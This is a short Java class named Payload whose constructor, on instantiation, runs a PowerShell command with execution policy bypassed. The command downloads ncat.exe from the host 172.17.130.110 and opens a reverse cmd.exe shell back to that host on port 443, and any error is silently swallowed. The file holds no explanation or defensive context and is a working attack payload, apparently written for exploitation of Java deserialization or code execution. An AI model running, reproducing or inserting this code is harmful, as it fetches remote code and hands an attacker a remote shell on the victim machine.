public class Payload {
    public Payload(){
 try {
            String payload = "powershell -exec bypass IEX(New-Object Net.WebClient).downloadFile('http://172.17.130.110/ncat.exe','ncat.exe');.\\ncat.exe -e cmd.exe 172.17.130.110 443";
            String cmds = "cmd.exe /c "+ payload;
            java.lang.Runtime.getRuntime().exec(cmds);    
 } catch (Exception e) {
	}
    }
}
